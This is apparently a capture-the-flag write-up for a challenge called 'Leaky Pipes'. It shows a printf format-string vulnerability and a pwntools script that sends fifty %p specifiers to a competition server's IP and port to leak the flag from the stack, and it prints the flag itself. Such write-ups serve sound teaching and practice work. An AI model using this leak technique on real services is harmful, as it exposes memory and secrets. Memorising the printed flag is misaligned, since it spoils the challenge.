# Leaky Pipes

## Analysis
We notice that the binary is using a vulnerable call of `printf`.
```
└─$ ./leaky_pipes
Tell me your secret so I can reveal mine ;) >> %p
Here's your secret.. I ain't telling mine :p
0xffd0f440
```

## Solution
We send a big payload of format specifiers to leak the flag, which is stored on the stack, and leak it.At the time of the competition I did this manually but here's a small pwntools script to do the same.
```python
from pwn import *
from Crypto.Util.number import long_to_bytes

p = remote("34.125.199.248", 1337)

p.sendline(b"%p"*50)

data = p.recvall().split(b"0x")[35:43]

print("".join(list(map(lambda x: long_to_bytes(int(x, 16))[::-1].decode(), data)))+'}')
```

## Flag
```
OSCTF{F0rm4t_5tr1ngs_l3ak4g3_l0l}
```
